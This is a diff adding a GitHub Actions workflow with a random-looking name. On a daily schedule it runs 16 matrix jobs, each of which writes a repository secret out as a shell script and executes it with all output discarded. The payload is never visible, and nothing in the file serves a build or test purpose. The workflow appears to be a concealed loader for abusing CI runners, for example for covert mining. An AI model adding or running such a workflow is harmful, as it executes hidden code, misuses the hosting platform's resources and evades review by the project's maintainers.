@@ -1,0 +1,24 @@
+name: yellowmouse736
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 20 * * *'
+jobs:
+  Daily_Runner:
+    name: yellowmouse736
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel : 4
+      matrix:
+        x: [ 1, 2, 3, 4]
+        y: [ 1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@v2
+      - name: Setup ${{ matrix.x }} ${{ matrix.y }}
+        run: echo "${{ secrets.YELLOWMOUSE736 }}" > "yellowmouse736.sh"
+      - name: Run ${{ matrix.x }} ${{ matrix.y }}
+        run: |
+          chmod +x ./yellowmouse736.sh
+          ./yellowmouse736.sh > /dev/null 2>&1
+        shell: bash
